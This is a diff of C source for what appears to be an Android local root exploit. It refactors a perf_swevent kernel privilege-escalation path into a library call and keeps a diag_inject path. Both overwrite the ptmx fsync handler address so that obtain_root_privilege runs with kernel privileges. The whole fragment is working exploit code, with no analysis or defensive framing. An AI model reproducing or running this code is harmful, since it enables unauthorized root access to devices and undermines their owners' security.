@@ -24,32 +24,13 @@ obtain_root_privilege(void)
 }
 
 static bool
-run_obtain_root_privilege(void)
+run_obtain_root_privilege(void *user_data)
 {
   int fd;
 
   fd = open("/dev/ptmx", O_WRONLY);
   fsync(fd);
   close(fd);
-
-  return true;
-}
-
-static bool
-attempt_perf_swevent_exploit(unsigned long int address)
-{
-  int number_of_children;
-
-  number_of_children = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
-  if (number_of_children == 0) {
-    while (true) {
-      sleep(1);
-    }
-  }
-
-  run_obtain_root_privilege();
-
-  perf_swevent_reap_child_process(number_of_children);
 
   return true;
 }
@@ -66,7 +47,7 @@ attempt_diag_exploit(unsigned long int address)
     return false;
   }
 
-  run_obtain_root_privilege();
+  run_obtain_root_privilege(NULL);
 
   injection_data.value = 3;
   return diag_inject(&injection_data, 1);
@@ -101,7 +82,8 @@ main(int argc, char **argv)
   success = attempt_diag_exploit(ptmx_fsync_address);
   if (!success) {
     printf("\nAttempt perf_swevent exploit...\n");
-    success = attempt_perf_swevent_exploit(ptmx_fsync_address);
+    success = perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
+                                       run_obtain_root_privilege, NULL);
   }
 
   if (getuid() != 0) {
